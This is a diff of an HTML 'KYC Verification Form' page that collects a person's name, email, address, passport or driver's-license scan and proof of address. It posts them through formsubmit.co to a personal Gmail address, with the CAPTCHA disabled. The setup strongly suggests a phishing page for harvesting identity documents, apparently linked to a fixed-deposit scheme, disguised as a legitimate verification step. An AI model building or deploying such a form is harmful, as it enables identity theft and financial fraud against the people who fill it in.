@@ -3,28 +3,92 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>KYC Form</title>
+  <title>KYC Verification Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f8;
+      padding: 40px;
+    }
+
+    .form-container {
+      background-color: #ffffff;
+      max-width: 500px;
+      margin: auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background-color: #007BFF;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-  <h2>KYC Submission</h2>
-  <form action="https://formsubmit.co/festgeldpartner@gmail.com" method="POST" enctype="multipart/form-data">
-    <!-- Disable CAPTCHA and redirect after submission -->
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://nextterminal.github.io/kyc-form/thanks.html">
+  <div class="form-container">
+    <h2>KYC Verification Form</h2>
+    <form action="https://formsubmit.co/festgeldpartner@gmail.com" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://yourusername.github.io/kyc-form/thanks.html">
 
-    <label>Full Name:</label><br>
-    <input type="text" name="fullname" required><br><br>
+      <label for="fullname">Full Name</label>
+      <input type="text" name="fullname" id="fullname" required>
 
-    <label>Email:</label><br>
-    <input type="email" name="email" required><br><br>
+      <label for="email">Email</label>
+      <input type="email" name="email" id="email" required>
 
-    <label>Address:</label><br>
-    <textarea name="address" required></textarea><br><br>
+      <label for="address">Address</label>
+      <textarea name="address" id="address" rows="3" required></textarea>
 
-    <label>Upload ID (PDF or Image):</label><br>
-    <input type="file" name="id_document" accept=".pdf,image/*" required><br><br>
+      <label for="id_type">ID Type</label>
+      <select name="id_type" id="id_type" required>
+        <option value="">Select one</option>
+        <option value="Passport">Passport</option>
+        <option value="Driver’s License">Driver’s License</option>
+      </select>
 
-    <button type="submit">Submit</button>
-  </form>
+      <label for="id_document">Upload ID Document (PDF/Image)</label>
+      <input type="file" name="id_document" id="id_document" accept=".pdf,image/*" required>
+
+      <label for="proof_of_address">Upload Proof of Address (Bill/Statement)</label>
+      <input type="file" name="proof_of_address" id="proof_of_address" accept=".pdf,image/*" required>
+
+      <button type="submit">Submit KYC</button>
+    </form>
+  </div>
 </body>
 </html>
